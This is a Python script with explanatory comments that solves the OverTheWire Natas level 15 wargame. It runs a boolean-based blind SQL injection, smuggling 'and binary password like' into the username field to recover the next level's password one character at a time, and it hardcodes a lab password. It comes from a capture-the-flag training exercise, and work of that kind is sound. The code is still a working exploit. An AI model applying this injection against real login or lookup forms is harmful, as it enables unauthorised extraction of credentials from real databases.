#!/usr/bin/env python

import requests
import re
from string import *

characters = uppercase + lowercase + digits	
	
username='natas15'
password='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/?debug=true'
session = requests.session()
files = { 'file':open('natas12_rce.php', 'rb')}
seen_pass = list()

while (len(seen_pass)!=32):

	for ch in characters:

		print "Trying with Password: ", "".join(seen_pass) + ch
		response = session.post(url + path, auth=(username,password), data= {'username': 'natas16" and binary password like "' + "".join(seen_pass) + ch + '%'})

		content = response.text
		
		if "This user exists." in content:
			seen_pass.append(ch)
			break

passw = ''.join(seen_pass)
print "Password is: ", passw


# Here, we had only one option to check whether a username was present or not. As from the sourcecode, it was clear that in the database there was a users table having username and password column and the query was searching the entered username in the username column and letting us know whether it existed or not.

# So, here we ran a loop to check character by character whether the password was correct or not
# The query part BINARY PASSWORD LIKE ch%  helped in that... BINARY matches the characters in their exact case (upper or lower), with LIKE we could determine if the passed string is a part of the password or not. And '%' is like a wildcard. So helping us guess the correct password character by character.

# The if clause checks for the output that is provided because if the correct username and password pattern does not exist in the table it wont the output that the user exists.